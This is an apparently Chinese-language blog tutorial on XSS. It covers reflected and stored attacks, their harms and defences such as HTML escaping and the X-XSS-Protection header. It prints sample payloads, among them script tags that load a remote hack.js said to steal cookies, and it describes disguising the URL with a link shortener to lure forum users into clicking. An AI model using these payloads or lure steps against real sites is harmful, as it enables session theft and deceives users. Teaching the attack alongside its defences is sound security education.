---
title: 常见web攻击
tags: []
categories: [web安全]
date: 2022-02-08 09:34:35
---

## 1. XSS

XSS，全称Cross-Site Scripting，跨站脚本攻击。通过在有安全漏洞的Web网站的注册用户的浏览器内运行非法的非本站点HTML标签或JavaScript进行的一种攻击。

XSS攻击可能造成的危害：

- 获取网站的数据
- 获取Cookies
- 劫持前端逻辑
- 发送虚假请求
- 偷取用户的资料
- 偷取用户的秘密和登录态
- 欺骗用户

### XSS攻击分类

- 反射型XSS攻击（url参数直接注入）

实现过程：

1. alert尝试（看该网站是否有xss漏洞）
2. 构造攻击url
3. 短域名伪造（通过短域名生成网站把上面构造的xss攻击url转换成看似正常的url）
4. 把构造好的url放到贴吧、论坛或微博等网站，加上诱惑性的语言描述，吸引用户点击（这一步很关键，因为只有用户点击了该url链接，才可能造成攻击）

例如：

```js
// 正常url
http://localhost:3000/?from=china

// 1. alert尝试
http://localhost:3000/?from=<script>alert(3)</script>

// 2. 构造攻击url：hack.js实现获取Cookie
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>

// 3. 短域名伪造：通过百度短网址网站（https://dwz.cn/）缩短url 
// 4. 把构造好的url放到贴吧
```

- 存储型 - 存储到数据库后读取时攻击

实现过程：

1. alert尝试（看该网站是否有xss漏洞）
2. 构造攻击脚本
3. 把攻击脚本注入网站数据库
4. 其他用户访问该网页时完成攻击

例如：

```js

// 1. alert尝试
// 在有评论功能的网站发送如下评论，如果能弹出alert提示说明存在漏洞
<script>alert(1)</script>

// 2. 构造攻击脚本：hack.js实现获取Cookie
我来了<script src="http://localhost:4000/hack.js"></script>

// 3. 把攻击脚本注入网站数据库：通过发评论实现
// 4. 其他用户访问该网页时完成攻击
```

### XSS攻击防范手段

- html转义（模板引擎和框架一般都自带html转义功能）
- 通过设置响应标头实现xss过滤（可以拦截xss脚本，但伪装一下就拦截不了了）

例如koa框架：

```js
ctx.set('X-XSS-Protection', 0) //0 关闭XSS过滤，1 启用xss过滤（浏览器默认值）
// http://localhost:3000/?from=<script>alert(3)</script> 可以拦截 但伪装一下就不行了
```
